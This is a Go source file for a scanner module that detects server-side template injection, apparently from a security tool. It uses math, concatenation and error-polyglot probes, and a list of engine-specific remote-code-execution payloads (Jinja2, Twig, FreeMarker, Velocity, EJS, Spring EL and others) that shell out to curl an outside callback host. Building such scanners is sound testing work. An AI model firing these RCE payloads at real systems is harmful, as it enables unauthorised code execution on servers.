package sstiscan

import (
	"context"
	"fmt"
	"math/rand/v2"
	"net/http"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/Indigo6415/Aperture/internal/collaborator"
	"github.com/Indigo6415/Aperture/internal/scanprogress"
)

type moduleMeta struct{ id, name, severity string }

var mathEvalModule = moduleMeta{id: "math-eval", name: "Template expression evaluated", severity: "critical"}
var errorSignatureModule = moduleMeta{id: "error-signature", name: "Template engine error signature", severity: "high"}
var oobRCEModule = moduleMeta{id: "oob-rce", name: "Blind SSTI -> RCE (out-of-band callback)", severity: "critical"}

// sstiProbe is one engine-specific probe. build returns a fresh payload and the
// exact text a successful evaluation of that payload renders. Every call draws
// new values, so a page cannot contain the expected text by chance or from an
// earlier request.
type sstiProbe struct {
	engine string
	// jinjaFamily marks the probes that share the {{ }} syntax of Jinja2 and
	// Twig. A hit on one of these is checked with the string-multiply probe to
	// tell Python's Jinja2 apart from its siblings.
	jinjaFamily bool
	build       func() (payload, expected string)
}

// freshOperands returns two random four-digit factors and their product. Four
// digits each keep the product at seven or eight digits, a number that a page
// is very unlikely to show by accident.
func freshOperands() (a, b int, product string) {
	a = 1000 + rand.IntN(9000)
	b = 1000 + rand.IntN(9000)
	return a, b, fmt.Sprint(a * b)
}

// freshMarker returns a random run of ten lowercase letters, split into two
// halves. An engine that evaluates a string concatenation renders the joined
// marker, and no digits are needed for that proof.
func freshMarker() (left, right, joined string) {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	b := make([]byte, 10)
	for i := range b {
		b[i] = letters[rand.IntN(len(letters))]
	}
	s := string(b)
	return s[:5], s[5:], s
}

// jinjaStringMultiplyPayload is Python's string multiplication: 11 times '7'.
// Python repeats the string, while Twig and Nunjucks compute 11 * 7 = 77, so
// this probe is the one that separates Python's Jinja2 from its siblings.
const (
	jinjaStringMultiplyPayload  = "{{11*'7'}}"
	jinjaStringMultiplyExpected = "77777777777"
)

// sstiProbes lists the engine probes in the order they are tried on a point.
// Each engine appears with an arithmetic probe; some also have a digit-free
// concatenation probe for engines where a number would be too easy to misread.
// The labels name the engine family whose syntax the probe uses.
func sstiProbes() []sstiProbe {
	return []sstiProbe{
		{engine: "Jinja2 / Twig / Nunjucks / Pebble / Tornado", jinjaFamily: true, build: func() (string, string) {
			a, b, product := freshOperands()
			return fmt.Sprintf("{{%d*%d}}", a, b), product
		}},
		{engine: "Jinja2 / Twig (string-concatenation marker)", build: func() (string, string) {
			left, right, joined := freshMarker()
			return fmt.Sprintf("{{'%s'~'%s'}}", left, right), joined
		}},
		{engine: "Jinja2 (Python string-multiply)", build: func() (string, string) {
			return jinjaStringMultiplyPayload, jinjaStringMultiplyExpected
		}},
		{engine: "FreeMarker / Mako / JSP EL / Spring EL / Groovy", build: func() (string, string) {
			a, b, product := freshOperands()
			return fmt.Sprintf("${%d*%d}", a, b), product
		}},
		{engine: "FreeMarker / Mako / JSP EL / Groovy (string-concatenation marker)", build: func() (string, string) {
			left, right, joined := freshMarker()
			return fmt.Sprintf("${'%s'+'%s'}", left, right), joined
		}},
		{engine: "ERB / EJS", build: func() (string, string) {
			a, b, product := freshOperands()
			return fmt.Sprintf("<%%= %d*%d %%>", a, b), product
		}},
		{engine: "ERB / EJS (string-concatenation marker)", build: func() (string, string) {
			left, right, joined := freshMarker()
			return fmt.Sprintf("<%%= '%s'+'%s' %%>", left, right), joined
		}},
		{engine: "Razor (ASP.NET)", build: func() (string, string) {
			a, b, product := freshOperands()
			return fmt.Sprintf("@(%d*%d)", a, b), product
		}},
		{engine: "Razor (ASP.NET) (string-concatenation marker)", build: func() (string, string) {
			left, right, joined := freshMarker()
			return fmt.Sprintf(`@("%s"+"%s")`, left, right), joined
		}},
		{engine: "Smarty ({math} plugin)", build: func() (string, string) {
			a, b, product := freshOperands()
			return fmt.Sprintf(`{math equation="%d*%d"}`, a, b), product
		}},
		{engine: "Smarty (bare expression)", build: func() (string, string) {
			a, b, product := freshOperands()
			return fmt.Sprintf("{%d*%d}", a, b), product
		}},
		{engine: "Velocity", build: func() (string, string) {
			a, b, product := freshOperands()
			return fmt.Sprintf("#set($aperture=%d*%d)$aperture", a, b), product
		}},
		{engine: "Thymeleaf (inline expression)", build: func() (string, string) {
			a, b, product := freshOperands()
			return fmt.Sprintf("[[${%d*%d}]]", a, b), product
		}},
		{engine: "Pug / Jade / JSF EL", build: func() (string, string) {
			a, b, product := freshOperands()
			return fmt.Sprintf("#{%d*%d}", a, b), product
		}},
		{engine: "doT (Node)", build: func() (string, string) {
			a, b, product := freshOperands()
			return fmt.Sprintf("{{=%d*%d}}", a, b), product
		}},
	}
}

// errorPolyglotPayload is the well-known multi-engine syntax-breaking
// string (James Kettle / PortSwigger's SSTI polyglot): malformed enough to
// trip the parser of virtually every mainstream template engine.
const errorPolyglotPayload = `${{<%[%'"}%\.}}%\`

// errorSignatures maps an engine name to substrings that only appear in that
// engine's own parse or runtime error output. A body matches an engine when
// any one of its signatures shows up and was not already on the baseline page,
// unless the engine is listed in requireAll, which needs every one. Generic
// fragments such as "Unexpected token" or "template: " are left out, since
// ordinary JavaScript and HTML error text uses them too.
var errorSignatures = map[string][]string{
	"Jinja2":           {"jinja2.exceptions"},
	"Twig":             {`Twig\Error`, "Twig_Error"},
	"FreeMarker":       {"freemarker.core", "FreeMarkerException"},
	"Velocity":         {"org.apache.velocity", "VelocityException"},
	"Smarty":           {"Smarty_Internal"},
	"Thymeleaf":        {"org.thymeleaf", "TemplateProcessingException"},
	"ERB / Ruby":       {"ActionView::Template::Error", "(erb):"},
	"Mako":             {"mako.exceptions"},
	"Pebble":           {"com.mitchellbosecke.pebble", "PebbleException"},
	"Handlebars":       {"Parse error on line", "Expecting '"},
	"Go text/template": {"template: ", `executing "`},
	"Razor":            {"Microsoft.AspNetCore.Razor", "RazorEngine.Templating"},
	"Tornado":          {"tornado.template.ParseError"},
	"Django":           {"django.template.exceptions.TemplateSyntaxError"},
	"Liquid":           {"Liquid::SyntaxError"},
}

// goTemplateEngine and handlebarsEngine are the engines whose signatures must
// all be present. Each pair is too generic to name its engine on its own.
const (
	goTemplateEngine = "Go text/template"
	handlebarsEngine = "Handlebars"
)

// requireAll lists the engines that need every signature in their entry, not
// just one.
var requireAll = map[string]bool{goTemplateEngine: true, handlebarsEngine: true}

// firstErrorSignature returns the first engine whose error signature appears
// in body and not in baseline. Engines are checked in sorted order so the same
// body always names the same engine: iterating the map directly made the
// reported engine change from run to run when two signatures matched.
func firstErrorSignature(body, baseline string) (engine, match string) {
	names := make([]string, 0, len(errorSignatures))
	for name := range errorSignatures {
		names = append(names, name)
	}
	sort.Strings(names)
	for _, name := range names {
		sigs := errorSignatures[name]
		if requireAll[name] {
			if allSignaturesPresent(body, baseline, sigs) {
				return name, sigs[0]
			}
			continue
		}
		// Any one signature is enough for this engine. The first match is
		// returned as the evidence.
		for _, s := range sigs {
			if strings.Contains(body, s) && !strings.Contains(baseline, s) {
				return name, s
			}
		}
	}
	return "", ""
}

// allSignaturesPresent reports whether every signature is in body and none of
// them is already in baseline.
func allSignaturesPresent(body, baseline string, sigs []string) bool {
	for _, s := range sigs {
		if !strings.Contains(body, s) || strings.Contains(baseline, s) {
			return false
		}
	}
	return true
}

// isAlnumAt reports whether s has an ASCII letter or digit at index i. An index
// outside s has none.
func isAlnumAt(s string, i int) bool {
	if i < 0 || i >= len(s) {
		return false
	}
	c := s[i]
	return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')
}

// containsStandalone reports whether needle appears in haystack as a whole
// token: the characters just before and just after the match must not be a
// letter or digit. A result such as 9801547 therefore does not match inside
// 19801547 or 98015470, where it would be a coincidence.
func containsStandalone(haystack, needle string) bool {
	if needle == "" {
		return false
	}
	// Scan every occurrence, not only the first, so a partial match early in
	// the body does not hide a whole-token match later on.
	for start := 0; ; {
		i := strings.Index(haystack[start:], needle)
		if i < 0 {
			return false
		}
		i += start
		end := i + len(needle)
		if !isAlnumAt(haystack, i-1) && !isAlnumAt(haystack, end) {
			return true
		}
		start = i + 1
	}
}

// evaluated reports whether body shows expected as the result of evaluating
// payload. It needs three things: the expected text as a whole token, the
// literal payload not echoed back (a page that echoes the input is not
// evaluating it), and the expected text absent from the original page.
func evaluated(body, payload, expected, baseline string) bool {
	return containsStandalone(body, expected) &&
		!strings.Contains(body, payload) &&
		!containsStandalone(baseline, expected)
}

// neutralMathValue is sent to the same point in place of a template expression.
// It cannot evaluate to any expected result, so it works as a negative control.
const neutralMathValue = "aperture1337neutral"

// pointDescriptor renders pt for a Finding's Label/Detail.
func pointDescriptor(pt injectionPoint) string {
	switch pt.Kind {
	case kindHeader:
		return fmt.Sprintf("the %q request header on %s", pt.Param, pt.URL)
	case kindForm:
		return fmt.Sprintf("form field %q (%s %s)", pt.Param, pt.Method, pt.URL)
	default:
		return fmt.Sprintf("query parameter %q on %s", pt.Param, pt.URL)
	}
}

// runMathEvalModule fires every math probe at every point and flags a point
// where the evaluated result appears without the literal expression. Each
// point reports at most one finding. A hit only counts when the result is
// not already on the original page, does not appear for a neutral value, and
// reproduces with a second, freshly drawn probe.
func runMathEvalModule(ctx context.Context, deps runDeps) []Finding {
	client := newClient()
	return runPointModule(deps, mathEvalModule, func(pt injectionPoint) (Finding, bool) {
		return probeMathPoint(ctx, deps, client, pt)
	})
}

// runPointModule runs check once per injection point, reporting each point as
// one progress check for meta, and returns the findings in point order. A
// point that yields nothing simply doesn't contribute a finding.
func runPointModule(deps runDeps, meta moduleMeta, check func(pt injectionPoint) (Finding, bool)) []Finding {
	type indexedPoint struct {
		idx int
		pt  injectionPoint
	}
	items := make([]indexedPoint, len(deps.points))
	for i, pt := range deps.points {
		items[i] = indexedPoint{idx: i, pt: pt}
	}
	found := make([]*Finding, len(items))
	scanprogress.Each(deps.rep, 0, items, func(it indexedPoint) scanprogress.Check {
		return scanprogress.Check{ID: meta.id + "|" + pointKey(it.pt), Label: pointDescriptor(it.pt), Group: meta.name}
	}, func(it indexedPoint) (int, error) {
		f, ok := check(it.pt)
		if !ok {
			return 0, nil
		}
		found[it.idx] = &f
		return 1, nil
	})
	out := []Finding{}
	for _, f := range found {
		if f != nil {
			out = append(out, *f)
		}
	}
	return out
}

// probeMathPoint tries the math probes on one point in order, stopping at the
// first that evaluates. The hit must survive the neutral control and a second
// probe with fresh values before it is reported.
func probeMathPoint(ctx context.Context, deps runDeps, client *http.Client, pt injectionPoint) (Finding, bool) {
	for _, p := range sstiProbes() {
		payload, expected := p.build()
		res := fetchInjectionPointThrottled(ctx, deps.sem, client, pt, payload, deps.req.Headers)
		if res.Err != nil || !evaluated(res.Body, payload, expected, deps.baseline) {
			continue
		}

		// Negative control: the same point with a value that cannot evaluate.
		// If the expected result still shows, the page prints it on its own.
		control := fetchInjectionPointThrottled(ctx, deps.sem, client, pt, neutralMathValue, deps.req.Headers)
		if control.Err == nil && containsStandalone(control.Body, expected) {
			continue
		}

		// Confirmation: a second probe of the same form with new values must
		// evaluate as well. A coincidence or a one-off reflection will not repeat
		// with fresh numbers.
		payload2, expected2 := p.build()
		confirm := fetchInjectionPointThrottled(ctx, deps.sem, client, pt, payload2, deps.req.Headers)
		if confirm.Err != nil || !evaluated(confirm.Body, payload2, expected2, deps.baseline) {
			continue
		}

		engine := p.engine
		// Only the Python engine repeats a string on multiplication. If the
		// string-multiply probe gives its expected result, the engine is Python's
		// Jinja2 rather than a sibling sharing the {{ }} syntax.
		if p.jinjaFamily && jinjaStringMultiplies(ctx, deps, client, pt) {
			engine = "Jinja2 (Python)"
		}
		return Finding{
			Label: fmt.Sprintf("Possible %s SSTI via %s", engine, pointDescriptor(pt)),
			Detail: fmt.Sprintf(
				"Set %s to the template expression `%s`; the response body then contained `%s` (the evaluated result) instead of the literal payload text. The result was not on the original page, a neutral value did not produce it, and a second probe with new values evaluated the same way, so the server evaluated this value as a %s template expression.",
				pointDescriptor(pt), payload, expected, engine,
			),
			Evidence:   expected,
			Method:     pt.Method,
			StatusCode: res.StatusCode,
			Request:    &res.Request,
			Confidence: ConfidenceConfirmed,
		}, true
	}
	return Finding{}, false
}

// jinjaStringMultiplies reports whether pt evaluates Python string
// multiplication. A sibling engine returns a different value, so only Python's
// Jinja2 yields the expected string.
func jinjaStringMultiplies(ctx context.Context, deps runDeps, client *http.Client, pt injectionPoint) bool {
	res := fetchInjectionPointThrottled(ctx, deps.sem, client, pt, jinjaStringMultiplyPayload, deps.req.Headers)
	return res.Err == nil && containsStandalone(res.Body, jinjaStringMultiplyExpected)
}

// runErrorSignatureModule fires the one syntax-breaking polyglot at every
// point and flags a response matching an engine's own error signature. The
// signature must be absent from a neutral-value response too: a page that
// shows an engine's error for any input is not reacting to the polyglot. The
// error alone doesn't prove expression evaluation, so these findings stay
// "likely".
func runErrorSignatureModule(ctx context.Context, deps runDeps) []Finding {
	client := newClient()
	return runPointModule(deps, errorSignatureModule, func(pt injectionPoint) (Finding, bool) {
		res := fetchInjectionPointThrottled(ctx, deps.sem, client, pt, errorPolyglotPayload, deps.req.Headers)
		if res.Err != nil {
			return Finding{}, false
		}
		engine, match := firstErrorSignature(res.Body, deps.baseline)
		if engine == "" {
			return Finding{}, false
		}

		// Neutral control: if a harmless value produces the same engine's error,
		// the page shows that error for any input and proves nothing about the
		// polyglot.
		control := fetchInjectionPointThrottled(ctx, deps.sem, client, pt, neutralMathValue, deps.req.Headers)
		if control.Err == nil {
			if controlEngine, _ := firstErrorSignature(control.Body, deps.baseline); controlEngine == engine {
				return Finding{}, false
			}
		}

		return Finding{
			Label: fmt.Sprintf("Possible %s template engine error via %s", engine, pointDescriptor(pt)),
			Detail: fmt.Sprintf(
				"Set %s to the template-breaking polyglot `%s`; the response then contained a %s error signature that the original page did not contain, and a harmless value did not produce it -- the server likely passed this value into a %s template without escaping its syntax. The error alone doesn't confirm full expression evaluation; cross-check against the math-eval module's findings for the same point.",
				pointDescriptor(pt), errorPolyglotPayload, engine, engine,
			),
			Evidence:   match,
			Method:     pt.Method,
			StatusCode: res.StatusCode,
			Request:    &res.Request,
			Confidence: ConfidenceLikely,
		}, true
	})
}

// oobPointCheck is the progress entry for one point's out-of-band RCE check.
func oobPointCheck(pt injectionPoint) scanprogress.Check {
	return scanprogress.Check{ID: oobRCEModule.id + "|" + pointKey(pt), Label: pointDescriptor(pt), Group: oobRCEModule.name}
}

// startOOBPoints plans every point's out-of-band check and marks them all
// running. The OOB module fires every payload and then waits on one shared
// callback window, so every point is in flight until that wait settles.
func startOOBPoints(rep scanprogress.Reporter, points []injectionPoint) {
	checks := make([]scanprogress.Check, len(points))
	for i, pt := range points {
		checks[i] = oobPointCheck(pt)
	}
	rep.Plan(checks...)
	for _, c := range checks {
		rep.Start(c.ID)
	}
}

// rceTemplatePayloads are well-documented, engine-specific SSTI-to-RCE
// payloads (the same ones cited across PortSwigger/HackTricks SSTI
// write-ups) built around a single shell command -- here, always a curl of
// the collaborator callback address. Each is best-effort: it depends on the
// target engine's exact version/sandboxing matching the documented gadget,
// same caveat ssrf.internalNetworkModule gives its own anomaly-based
// findings. Every payload is a single callback and nothing else: no file is
// written or removed and no shell is opened.
var rceTemplatePayloads = []struct {
	engine string
	build  func(cmd string) string
}{
	{"Jinja2 (unsandboxed Flask/Python)", func(cmd string) string {
		return fmt.Sprintf(`{{ self.__init__.__globals__.__builtins__.__import__('os').popen(%q).read() }}`, cmd)
	}},
	{"Twig >=2.4 (sandbox disabled, PHP)", func(cmd string) string {
		return fmt.Sprintf(`{{['%s']|filter('system')}}`, cmd)
	}},
	{"FreeMarker (Java)", func(cmd string) string {
		return fmt.Sprintf(`<#assign ex="freemarker.template.utility.Execute"?new()>${ex(%q)}`, cmd)
	}},
	{"Velocity (Java)", func(cmd string) string {
		return fmt.Sprintf(`#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass().forName("java.lang.String")).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),%q)`, cmd)
	}},
	{"Smarty (legacy, {php} tags enabled)", func(cmd string) string {
		return fmt.Sprintf(`{php}exec(%q);{/php}`, cmd)
	}},
	{"ERB (Ruby, backtick exec)", func(cmd string) string {
		return fmt.Sprintf("<%%= `%s` %%>", cmd)
	}},
	{"EJS (Node, child_process)", func(cmd string) string {
		return fmt.Sprintf(`<%%= global.process.mainModule.require('child_process').execSync(%q) %%>`, cmd)
	}},
	{"Mako (Python)", func(cmd string) string {
		return fmt.Sprintf(`<%%import os%%>${os.popen(%q).read()}`, cmd)
	}},
	{"Thymeleaf / Spring EL (Java Runtime)", func(cmd string) string {
		return fmt.Sprintf(`[[${T(java.lang.Runtime).getRuntime().exec(%q)}]]`, cmd)
	}},
}

// runOOBRCEModule dispatches to the shared-token or per-point-token path --
// see OOBConfig's doc comment for when each applies.
func runOOBRCEModule(ctx context.Context, deps runDeps, oob OOBConfig) []Finding {
	if oob.SharedToken != "" {
		return runOOBRCEModuleShared(ctx, deps, oob)
	}

	if oob.Registry == nil || oob.CallbackBaseURL == "" {
		return []Finding{{
			Label:  "Out-of-band callback listener not configured",
			Detail: "This module confirms a fully blind SSTI (no visible signal in the math-eval or error-signature modules -- auto-escaped output, a generic error page, or a sandboxed-but-still-exploitable engine) by sending well-documented, engine-specific RCE payloads that shell out to curl Aperture's own collaborator listener. Configure a collaborator domain/answer IP in Settings to enable it.",
		}}
	}

	client := newClient()
	type tokenInfo struct {
		pt    injectionPoint
		token string
	}
	infos := make([]tokenInfo, len(deps.points))
	for i, pt := range deps.points {
		infos[i] = tokenInfo{pt: pt, token: oob.Registry.NewToken()}
	}

	startOOBPoints(deps.rep, deps.points)

	var wg sync.WaitGroup
	for _, info := range infos {
		callbackURL := strings.TrimRight(oob.CallbackBaseURL, "/") + "/collab/" + info.token + "/"
		cmd := "curl " + callbackURL
		for _, rp := range rceTemplatePayloads {
			wg.Add(1)
			go func(pt injectionPoint, payload string) {
				defer wg.Done()
				fetchInjectionPointThrottled(ctx, deps.sem, client, pt, payload, deps.req.Headers)
			}(info.pt, rp.build(cmd))
		}
	}
	wg.Wait()

	tokens := make([]string, 0, len(infos))
	for _, info := range infos {
		tokens = append(tokens, info.token)
	}
	deps.rep.Phase("Waiting for out-of-band callbacks")
	collaborator.WaitForRegistry(ctx, oob.Registry, tokens, collaborator.DefaultPollInterval, collaborator.DefaultQuietPeriod, collaborator.DefaultMaxWait)

	var out []Finding
	for _, info := range infos {
		id := oobPointCheck(info.pt).ID
		hits := oob.Registry.Poll(info.token)
		if len(hits) == 0 {
			deps.rep.Done(id, 0, nil)
			continue
		}
		out = append(out, sstiOOBFinding(info.pt, hits))
		deps.rep.Done(id, 1, nil)
	}
	return out
}

// sstiIdentifierFor derives a stable, DNS-label-and-URL-path-safe
// identifier for pt -- used only on the oob.SharedToken path, where many
// points share one token and need to stay distinguishable. Same approach as
// ssrf.ssrfIdentifierFor.
func sstiIdentifierFor(pt injectionPoint) string {
	var b strings.Builder
	b.WriteString("ssti-")
	for _, r := range pt.Param {
		switch {
		case r >= 'a' && r <= 'z', r >= '0' && r <= '9':
			b.WriteRune(r)
		case r >= 'A' && r <= 'Z':
			b.WriteRune(r + ('a' - 'A'))
		default:
			b.WriteByte('-')
		}
	}
	return b.String()
}

// runOOBRCEModuleShared is runOOBRCEModule's oob.SharedToken path -- see
// OOBConfig's doc comment.
func runOOBRCEModuleShared(ctx context.Context, deps runDeps, oob OOBConfig) []Finding {
	client := newClient()
	type pointInfo struct {
		pt         injectionPoint
		identifier string
	}
	infos := make([]pointInfo, len(deps.points))
	for i, pt := range deps.points {
		infos[i] = pointInfo{pt: pt, identifier: sstiIdentifierFor(pt)}
	}

	startOOBPoints(deps.rep, deps.points)

	var wg sync.WaitGroup
	for _, info := range infos {
		var callbackURL string
		if oob.SharedProvider == "webhooksite" {
			callbackURL = collaborator.WebhookSiteCallbackURL(oob.SharedToken) + "/" + info.identifier + "/"
		} else {
			callbackURL = strings.TrimRight(oob.CallbackBaseURL, "/") + "/collab/" + oob.SharedToken + "/" + info.identifier + "/"
		}
		cmd := "curl " + callbackURL
		for _, rp := range rceTemplatePayloads {
			wg.Add(1)
			go func(pt injectionPoint, payload string) {
				defer wg.Done()
				fetchInjectionPointThrottled(ctx, deps.sem, client, pt, payload, deps.req.Headers)
			}(info.pt, rp.build(cmd))
		}
	}
	wg.Wait()

	deps.rep.Phase("Waiting for out-of-band callbacks")
	var hits []collaborator.Interaction
	var err error
	if oob.SharedProvider == "webhooksite" {
		hits, err = collaborator.WaitForCallbacks(ctx, func(c context.Context) ([]collaborator.Interaction, error) {
			return collaborator.PollWebhookSite(c, oob.SharedToken)
		}, collaborator.DefaultPollInterval, collaborator.DefaultQuietPeriod, collaborator.DefaultMaxWait)
	} else if oob.Registry != nil {
		collaborator.WaitForRegistry(ctx, oob.Registry, []string{oob.SharedToken}, collaborator.DefaultPollInterval, collaborator.DefaultQuietPeriod, collaborator.DefaultMaxWait)
		hits = oob.Registry.Poll(oob.SharedToken)
	}
	// A failed poll discards whatever it returned, so every point reads as "no callback".
	if err != nil {
		hits = nil
	}

	byIdentifier := map[string][]collaborator.Interaction{}
	for _, h := range hits {
		byIdentifier[h.Identifier] = append(byIdentifier[h.Identifier], h)
	}

	var out []Finding
	for _, info := range infos {
		id := oobPointCheck(info.pt).ID
		matched := byIdentifier[info.identifier]
		if len(matched) == 0 {
			deps.rep.Done(id, 0, nil)
			continue
		}
		out = append(out, sstiOOBFinding(info.pt, matched))
		deps.rep.Done(id, 1, nil)
	}
	return out
}

// sstiOOBFinding builds the Finding every confirmed-hit path above returns,
// given pt and its full hit list.
func sstiOOBFinding(pt injectionPoint, hits []collaborator.Interaction) Finding {
	h := hits[0]
	return Finding{
		Label: fmt.Sprintf("%s triggered a blind out-of-band callback (confirmed RCE via SSTI)", pointDescriptor(pt)),
		Detail: fmt.Sprintf(
			"One of this module's engine-specific RCE payloads, sent to %s, caused the target to call back out to an Aperture-controlled listener (%d interaction(s), first from %s) -- confirms server-side code execution via template injection, independent of anything visible in the HTTP response itself.",
			pointDescriptor(pt), len(hits), h.RemoteAddr,
		),
		Evidence: fmt.Sprintf("%s callback from %s at %s", h.Protocol, h.RemoteAddr, h.Timestamp.Format(time.RFC3339)),
		Method:   pt.Method,
		// A callback that the target itself made is direct proof of execution.
		Confidence: ConfidenceConfirmed,
		Callback:   true,
	}
}
